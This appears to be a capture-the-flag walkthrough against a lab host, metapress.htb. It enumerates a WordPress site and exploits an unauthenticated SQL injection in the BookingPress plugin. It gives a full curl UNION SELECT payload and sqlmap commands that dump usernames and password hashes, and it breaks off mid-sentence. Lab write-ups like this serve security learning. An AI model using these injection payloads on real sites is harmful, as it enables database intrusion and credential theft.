# Reconnaissance

## Port Scan (nmap)

**Command:**\
*sudo nmap -sC -sV -p- {IP address}*

**Command Description:**\
* -sC : Use default scripts
* -sV Service version
* -p- : Scan all ports
* {IP address} - Target host

**Results:**\
TCP Ports Open:
* 21 - FTP
* 22 - SSH
* 80 - HTTP

**Actions:**\
Edit */etc/hosts* and add the follwing line to display the website correctly on port 80 (HTTP): *{IP address} 	metapress.htb*

Looking at the page we can see that it is most likely WordPress. We can check the source code of http://metapress.htb/events/ or also use *Wappalyzer* extension to see that it is using WordPress with version 5.6.2.

![image](https://user-images.githubusercontent.com/85443537/226896247-4f303963-a538-4210-a13e-2759fa3cf1ed.png)

## Directory Scan (gobuster)

**Command:**\
*gobuster dir -u http://metapress.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt*

**Command Description:**
* dir : Directory scan
* -u : Target url
* -w : Directory wordlist

**Results:**\
The interesting directory that was found: */wp-admin*

**Actions:**\
Navigate to: *http://metapress.htb/wp-admin*

After navigating to wp-admin we find that it requires a login. We try default passwords but with no luck.

##  Finding possible WordPress vulnerabilities using WPScan (wpscan)

We type the following command to run the wordpress security scan.

**Command:**\
*wpscan --url metapress.htb --api-token {Your API-token}
*

**Results:**\
We find a possible vulnerability "Authenticated XXE Within the Media Library Affecting PHP 8" for WordPress versions 5.6-5.7. The WordPress version of the webserver found was 5.6.2.

![image](https://user-images.githubusercontent.com/85443537/226898865-a6e1404a-e6a6-469f-bf6c-b7ad5882afea.png)

We look at the source code of the */events* page again and find that it is using bookingpress version 1.0.10.

![image](https://user-images.githubusercontent.com/85443537/226902782-7e98982f-d287-4d4e-b8d5-c5b94a3470db.png)

We navigate to the first link of "References" (https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
) to learn more about how to exploit this identified vulnerability.

The description from the reference is: 
*The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection*

To exploit this we need to find the *_wpnonce* value which can also be found in the */events* source page.

![image](https://user-images.githubusercontent.com/85443537/226904218-d7a417bc-eb1f-494e-90e3-fc9cb5aa96ef.png)

_wpnonce = 8181f9cfbb

## Capturing the request using BurpSuite (burpsuite)

Open burpsuite and capture the request after running the following command in the terminal
Note: Replace the _wpnonce with your value.

*curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=8181f9cfbb&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080*
  
It should look something like this in burpsuite:

![image](https://user-images.githubusercontent.com/85443537/226907046-2f2c8226-58c7-41f1-bfa5-6b05dd10de46.png)

And giving you the response:

![image](https://user-images.githubusercontent.com/85443537/226907090-3a2404d4-df0b-4715-9384-6886c28a1236.png)

We then save the POST request to a file by right clicking on the request and choosing the option *Copy to file* (we call it bookingpress.req).

![image](https://user-images.githubusercontent.com/85443537/226907483-57fdd4b3-e9b0-4170-bab2-efb6be48bb77.png)

Edit the copied file and change the *total_service* value to any number, in our case we will put it as 1. Then remove the "Injection" part from the query so that the only thing that will be left is the following:
*action=bookingpress_front_get_category_services&_wpnonce=8181f9cfbb&category_id=33&total_service=1)*

The edited request file should look like this:

POST /wp-admin/admin-ajax.php HTTP/1.1\
Host: metapress.htb\
User-Agent: curl/7.87.0\
Accept: */*\
Content-Length: 185\
Content-Type: application/x-www-form-urlencoded\
Connection: close

action=bookingpress_front_get_category_services&_wpnonce=8181f9cfbb&category_id=33&total_service=1)

## Dumping Database using SQLMap (sqlmap)

Type the following command in the terminal to see if the parameter is injectable:

**Command:**\
*sqlmap -r bookingpress.req -p total_service --batch*

**Command Description:**\
* -r : Request file
* -p : Parameter
* --batch : Non-interactive session (do not ask for user input)

**Results:**\
The parameter is injectable.

We can now list the databases using the following command:

**Command:**\
*sqlmap -r bookingpress.req -p total_service --dbs*

**Results:**\
Tables: *blog* and *information_schema*

We look further into the blog database by writting the following command:

**Command:**\
*sqlmap -r bookingpress.req -p total_service -D blog --tables*

**Results:**\
We found an interesting table called *wp_users*

We look into the wp_users table by dumping it using the following command:

**Command:**\
*sqlmap -r bookingpress.req -p total_service -D blog -T wp_users --dump*

**Results:**\
We get two users that are interesting, *manager* and *admin*. We also get their corresponding hash.

![image](https://user-images.githubusercontent.com/85443537/226912431-c5ecffff-6fca-454b-a372-8a9ac0e7a6df.png)

To make it more visible we can use this command instead to get the username and hash only by looking into user_login and user_pass columns:

*sqlmap -r bookingpress.req -p total_service -D blog -T wp_users -C user_login,user_pass --batch --dump*

![image](https://user-images.githubusercontent.com/85443537/226911825-bb904bc3-cf60-4910-9583-c5dc56882d7a.png)

We 






